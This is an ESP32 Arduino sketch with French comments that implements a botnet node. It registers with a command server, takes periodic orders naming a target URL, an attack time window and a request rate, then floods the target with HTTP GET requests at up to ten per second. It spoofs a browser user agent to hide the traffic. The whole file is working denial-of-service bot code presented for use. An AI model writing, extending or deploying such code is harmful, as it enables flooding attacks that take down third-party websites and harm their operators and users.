#include <WiFi.h>
#include <HTTPClient.h>
#include <ArduinoJson.h>
#include <Preferences.h>
#include <time.h>

// --- CONFIGURATION ---
const char* ssid     = "wifi-ssid";
const char* password = "wifi_pass";

// IP DU SERVEUR
String serverBase = "http://192.168.1.191:5820/api"; 

// --- VARIABLES ---
Preferences preferences;
String myToken = "";

// Variables de mission
bool active = false;
String targetUrl = "";
int startH=0, startM=0, stopH=0, stopM=0;

// --- CHRONOMETRES DISTINCTS ---
// Intervalle d'attaque (en millisecondes). Par défaut 1000ms (1 sec).
// Pour 10 tirs par seconde, l'API devra envoyer "100" (ms).
unsigned long attackIntervalMs = 1000; 

// Intervalle de contact QG (FIXE à 60s)
const unsigned long heartbeatInterval = 60000; 

unsigned long lastHeartbeat = 0;
unsigned long lastAttack = 0;
unsigned long lastDebugPrint = 0;

// NTP
const char* ntpServer = "pool.ntp.org";
const long  gmtOffset_sec = 3600;      
const int   daylightOffset_sec = 3600; 

void setup() {
  Serial.begin(115200);
  delay(1000);
  Serial.println("\n\n--- DEMARRAGE ESP32 (Mode Rapide) ---");
  
  // 1. WiFi
  Serial.print("Connexion au WiFi ");
  Serial.print(ssid);
  WiFi.begin(ssid, password);
  while(WiFi.status() != WL_CONNECTED) { delay(500); Serial.print("."); }
  Serial.println("\n✅ WiFi Connecté ! IP: " + WiFi.localIP().toString());

  // 2. Token
  preferences.begin("botnet", false);
  myToken = preferences.getString("token", "");
  
  if (myToken == "") {
    Serial.println(">>> Token vide -> Lancement procédure enregistrement...");
    registerDevice();
  } else {
    Serial.println(">>> Token trouvé en mémoire : " + myToken);
  }

  // 3. Heure
  configTime(gmtOffset_sec, daylightOffset_sec, ntpServer);
  struct tm t;
  if(getLocalTime(&t)){
    Serial.println("✅ Heure synchronisée !");
  } else {
    Serial.println("⚠️ ATTENTION: Echec synchro NTP au démarrage.");
  }
}

void loop() {
  if(WiFi.status() != WL_CONNECTED) { 
    WiFi.reconnect(); 
    return; 
  }

  unsigned long currentMillis = millis();

  // --- 1. HEARTBEAT (FIXE TOUTES LES 60 SECONDES) ---
  if (currentMillis - lastHeartbeat > heartbeatInterval || lastHeartbeat == 0) {
    Serial.println("\n[HEARTBEAT] Contact du QG (Check routine)...");
    sendHeartbeat();
    lastHeartbeat = currentMillis;
  }

  // --- LOGIQUE D'ATTAQUE ---
  struct tm t;
  bool ntpOk = getLocalTime(&t);

  // DEBUG (Toutes les 5s)
  if (currentMillis - lastDebugPrint > 5000) {
    Serial.println("\n--- DIAGNOSTIC ---");
    if (!ntpOk) Serial.println("❌ Erreur NTP");
    else Serial.printf("🕒 Heure : %02d:%02d:%02d\n", t.tm_hour, t.tm_min, t.tm_sec);
    
    Serial.printf("📋 Status : Active=%s | Vitesse Tir=%lu ms\n", active ? "OUI" : "NON", attackIntervalMs);
    Serial.printf("🎯 Cible : %s\n", targetUrl.c_str());
    lastDebugPrint = currentMillis;
  }

  if (active && ntpOk) {
      int now = t.tm_hour*60 + t.tm_min;
      int start = startH*60 + startM;
      int stop = stopH*60 + stopM;
      
      bool timeOK = (start < stop) ? (now >= start && now < stop) : (now >= start || now < stop);

      if (timeOK) {
        // --- 2. ATTAQUE RAPIDE (EN MILLISECONDES) ---
        if (currentMillis - lastAttack > attackIntervalMs) {
          performAttack();
          lastAttack = currentMillis;
        }
      } 
  }
  
  // Petit delay pour éviter de bloquer le CPU, mais très court pour la rapidité
  delay(10); 
}

// --- FONCTION ENRÔLEMENT ---
void registerDevice() {
  HTTPClient http;
  http.begin(serverBase + "/register");
  int code = http.POST("{}"); 
  
  if (code == 200) {
    String response = http.getString();
    DynamicJsonDocument doc(1024);
    deserializeJson(doc, response);
    String newToken = doc["token"].as<String>();
    preferences.putString("token", newToken);
    myToken = newToken;
    Serial.println("✅ Token sauvegardé: " + myToken);
  } else {
    Serial.printf("❌ Erreur Register (%d)\n", code);
    delay(5000);
  }
  http.end();
}

// --- FONCTION HEARTBEAT ---
void sendHeartbeat() {
  HTTPClient http;
  http.begin(serverBase + "/heartbeat");
  http.addHeader("Content-Type", "application/json");
  
  String payload = "{\"token\":\"" + myToken + "\"}";
  int code = http.POST(payload);
  
  if (code == 200) {
    String response = http.getString();
    DynamicJsonDocument doc(2048);
    DeserializationError error = deserializeJson(doc, response);

    if (!error) {
        JsonObject orders = doc["orders"];
        active = orders["active"];
        targetUrl = orders["target_url"].as<String>();
        startH = orders["start_h"]; startM = orders["start_m"];
        stopH = orders["stop_h"]; stopM = orders["stop_m"];
        
        // --- CORRECTION MILLISECONDES ---
        // L'API envoie l'intervalle (probablement en secondes ou millisecondes selon ton choix)
        // Ici on considère que l'API envoie des MILLISECONDES si tu veux de la précision.
        // Si tu mets "100" dans l'interface, ça fera 100ms (10 tirs/sec).
        int val = orders["interval"];
        
        // Sécurité : pas moins de 100ms (10 tirs/sec max) pour éviter crash ESP
        if (val < 100) val = 100; 
        
        attackIntervalMs = val;
        Serial.printf("✅ Config MAJ: Tir toutes les %lu ms.\n", attackIntervalMs);
    }
  } else {
    Serial.printf("❌ Erreur Heartbeat (%d)\n", code);
  }
  http.end();
}

// --- FONCTION ATTAQUE ---
void performAttack() {
  if (targetUrl == "") return;
  
  HTTPClient http;
  // Pas de Serial.print ici pour gagner de la vitesse, sauf code erreur
  http.begin(targetUrl);
  http.setUserAgent("Mozilla/5.0 (Windows NT 10.0; Win64; x64)"); 
  
  int code = http.GET();
  
  if(code > 0) {
      Serial.printf("🚀 Tir -> %d\n", code);
  } else {
      Serial.printf("⚠️ Erreur Tir: %s\n", http.errorToString(code).c_str());
  }
  http.end();
}
